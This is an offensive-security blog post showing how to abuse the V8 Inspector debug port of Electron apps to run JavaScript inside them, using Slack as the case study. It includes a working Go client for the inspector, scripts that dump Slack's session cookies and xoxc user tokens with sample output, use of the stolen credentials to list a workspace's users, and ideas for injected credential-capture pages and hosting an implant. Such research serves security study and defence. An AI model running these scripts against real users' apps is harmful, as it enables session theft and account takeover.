---
author: actae0n 
layout: post
title: Looting Electron Apps Via The V8 Inspector
---
## What Is The V8 Inspector?
V8 is the JavaScript engine that ships as part of both Chromium (and derivatives) as well as Node (which is in turn included in Electron). V8 provides a [debugging interface](https://v8.dev/docs/inspector) that implements a subset of the Chrome DevTools Protocol (hereafter referred to as CDP). In Chromium, Chrome, and other Blink based browsers, methods from all Domains of CDP are exposed through the stub (see the ["tip-of-tree"](https://chromedevtools.github.io/devtools-protocol/tot/) or ["stable"](https://chromedevtools.github.io/devtools-protocol/1-2/) protocol versions). This will include methods to interface with some of the browser-oriented elements, such as the DOM, page, etc.  However, in Electron applications, we're targeting the Node environment. This relegates us to a smaller subset of the CDP ([v8-inspector (node)](https://chromedevtools.github.io/devtools-protocol/v8/)). 

## How Is This Useful?
Many Electron applications ship with the command-line option to [enable the V8 Inspector at startup](https://www.electronjs.org/docs/tutorial/debugging-main-process), binding it to a local port. We can then connect to this port and perform introspection and manipulation on the target application, extracting secrets along the way. We'll use Slack as a case study in this post, extracting the AuthN token and cookie.  

## Starting The Inspector
To launch the target with the V8 Inspector enabled, we can use the `--inspect` option. Many Electron applications have this enabled (e.g [Ledger Live](https://www.ledger.com/ledger-live)), just give it a shot on your favorites. In the below example, we're launching Slack on MacOS.
```
$ /Applications/Slack.app/Contents/MacOS/Slack --inspect

Debugger listening on ws://127.0.0.1:9229/b84df45f-b494-4e18-b77c-d8ed8f34c44d
For help, see: https://nodejs.org/en/docs/inspector
Initializing local storage instance
(node:82531) [DEP0005] DeprecationWarning: Buffer() is deprecated due to security and usability issues. Please use the Buffer.alloc(), Buffer.allocUnsafe(), or Buffer.from() methods instead.
(Use `Slack --trace-deprecation ...` to show where the warning was created)
[08/29/21, 19:12:21:841] info:
╔══════════════════════════════════════════════════════╗
║      Slack 4.18.0, darwin (Store) 20.6.0 on x64      ║
╚══════════════════════════════════════════════════════╝
```

## Speaking The Protocol
Luckily for us, [Golang bindings](https://github.com/mafredri/cdp) for the CDP are available. This should allow us to invoke methods on the target with fairly little code.

While the full CDP exposes some gnarly stuff ([see MangoPDF's usage of Network.getAllCookies](https://mango.pdf.zone/stealing-chrome-cookies-without-a-password)), the bulk of those methods are not exposed in the Node version. For example, if you attempt to invoke the `Network.GetAllCookies` method, you'll get an RPC error:  `GetAllCookies: rpc error: 'Network.getAllCookies' wasn't found (code = -32601)`). 

However, the `Runtime` domain exposes something even more powerful, direct access to the JavaScript VM that's running in the target. Using the `Runtime.evaluate` method (or the pair of `Runtime.compileScript` and `Runtime.runScript`), we can execute JavaScript snippets within the context of the Electron application. We can execute some JS snippets remotely with some short PoC code:
```go
func main() {
	scriptPath := flag.String("script", "", "Path to JS script to evaluate in the target")
	inspectTarget := flag.String("inspect-target", "", "V8 inspector listener")
	flag.Parse()
	if *inspectTarget == "" {
		log.Fatalf("Must specify inspector target")
	}
	if *scriptPath == "" {
		log.Fatalf("Must specify script payload")
	}

	scriptData, err := ioutil.ReadFile(*scriptPath)
	if err != nil {
		panic(err)
	}

	ctx, cancel := context.WithTimeout(context.Background(), 5*time.Second)
	defer cancel()
	devt := devtool.New(*inspectTarget)
	pt, err := devt.Get(ctx, devtool.Node)
	if err != nil {
		panic(err)
	}
	conn, err := rpcc.DialContext(ctx, pt.WebSocketDebuggerURL)
	if err != nil {
		panic(err)
	}
	defer conn.Close()
	c := cdp.NewClient(conn)

	eval := runtime.NewEvaluateArgs(string(scriptData))
	eval.AwaitPromise = BoolAddr(true)
	eval.ReplMode = BoolAddr(true)
	reply, err := c.Runtime.Evaluate(context.Background(), eval)
	if err != nil {
		panic(err)
	}

	if reply.ExceptionDetails != nil {
		// Dump the exception details if the script run was unsuccessful
		log.Fatalf("Exception(line %d, col %d): %v\n", reply.ExceptionDetails.LineNumber, reply.ExceptionDetails.ColumnNumber, reply.ExceptionDetails.Exception)
	}

	// discarding the error result, failure doesn't matter.
	// This will just handle cases where string results come
	// back doubled escaped, causing parsing issues in follow-up
	// tools like `jq`
	s, _ := strconv.Unquote(string((*reply).Result.Value))

	fmt.Printf("%s\n", s)
}
```

For the full code with the example scripts, check out [electron-probe](https://github.com/xpcmdshell/electron-probe).

## Building Something Useful
Particularly of interest are the [Session API](https://www.electronjs.org/docs/api/session) and the [WebContents API](https://www.electronjs.org/docs/api/web-contents).

Let's get a handle to the Electron runtime, so that we can access all the methods [included in its API](https://www.electronjs.org/docs/api):

```js
electron = process.mainModule.require('electron');
```

First up, using the Session API we can get access to the cookie storage of the current session(`defaultSession`):
```js
// dump_slack_cookies.js
electron = process.mainModule.require('electron');
JSON.stringify((await electron.session.defaultSession.cookies.get({})))
```

You may notice that we used `JSON.stringify` on the result. Getting values out of the V8 VM can be finicky, depending on the object type returned. I'm resorting to pulling out objects as strings of JSON for easy parsing. For more robust handling of different object types being returned, see `Runtime.getProperties` and `Runtime.queryObjects`. 

Running the result, it appears to work:
```shell
$ ./electron-probe -inspect-target http://localhost:9229 -script scripts/dump_slack_cookies.js | jq 

[
  [... SNIP]
    {
    "name": "ssb_instance_id",
    "value": "90d5538e- [ REDACTED ]",
    "domain": ".slack.com",
    "hostOnly": false,
    "path": "/",
    "secure": false,
    "httpOnly": false,
    "session": false,
    "expirationDate": 1945639889,
    "sameSite": "unspecified"
  },
  {
    "name": "d",
    "value": "aX9QnD8F [ REDACTED ]",
    "domain": ".slack.com",
    "hostOnly": false,
    "path": "/",
    "secure": true,
    "httpOnly": true,
    "session": false,
    "expirationDate": 1941391182.507454,
    "sameSite": "lax"
  },
 [...SNIP]
]
```
We've extracted the `d` cookie value from a running Slack instance. This is half of the material we need to steal a session.

---

Next, let's work on lifting out the user token that goes with that cookie. The token is submitted with every request in the request body, and begins with `xoxc-`. It should be accessible via the `localConfig_v2` key in Local Storage:
```js
// dump_slack_tokens.js
// Get a handle to the Electron APIs
electron = process.mainModule.require('electron');

// Get the first WebContents instance that we can access the associated Local Storage
window = electron.webContents.getAllWebContents()[0];

// We have to go one level deeper. Using javascript execution in Electron's V8 runtime, we
// will in turn trigger javascript execution in the target window.
// Look, I'm not proud of it either. 
let config_blob = await window.executeJavaScript('localStorage.localConfig_v2');

// Shave off the cruft and make a nice object to stringify that just contains the 
// workspace name and the associated token.
let config_obj = JSON.parse(config_blob);
let teams = Object.values(config_obj.teams)
let extracted_teams = [];

teams.forEach(e => {
  extracted_teams.push({
    'name': e.name,
    'token': e.token
  })
});

JSON.stringify(extracted_teams)
```

Let's see what we got:
```shell
$ ./electron-probe -inspect-target http://localhost:9229 -script scripts/dump_slack_tokens.js | jq

[
  {
    "name": "r2c",
    "token": "xoxc-65630S1[ REDACTED ]"
  },
  {
    "name": "Binary Ninja Public Chat",
    "token": "xoxc-1300035[ REDACTED ]"
  }, 
  [ SNIP ]
]
```

## Using The Credentials
Now we have both the `d` cookie as well as the `xoxc` token required to authenticate as our target user. We can use these credentials together to access the Slack API as the target user. For example, we can use [Slarf](https://github.com/xpcmdshell/slarf) to dump the user directory for a workspace:
```shell
$ ./slarf -cookie aX9QnD8F[REDACT] -token xoxc-1300035[REDACT] | jq '.[].name'
"slackbot"
"actae0n"
[ SNIP ]
```

## Rapid JS Payload Prototyping
If you want a nicer environment to develop your JS payloads in, I'd recommend using the Chrome/Chromium/Brave DevTools to talk to the Inspector. Once the target application has been launched with the Inspector listening, you can attach to it by navigating to `chrome://inspect`. 

![chrome://inspect]({{site.url}}/images/electron_loot/devtools_remote.png)

In the `Remote Target (localhost)` section, you should see your target listed. You can click the `inspect` button to open DevTools for your target.

![DevTools For Electron]({{site.url}}/images/electron_loot/devtools_env.png)

## Additional Ideas
Since you have direct access to the WebContents object, you could rewrite the DOM or redirect at will (e.g embedding a credential capture page) by loading content with `WebContents.loadURL()`. Check out the `inline_content.js` and `redirect.js` scripts for examples of this.

Electron also has some support (albeit unsafe) for loading Node extensions at runtime using `process.dlopen()`, however I didn't explore this. Using Slack as a host for your implant would be nice though! 
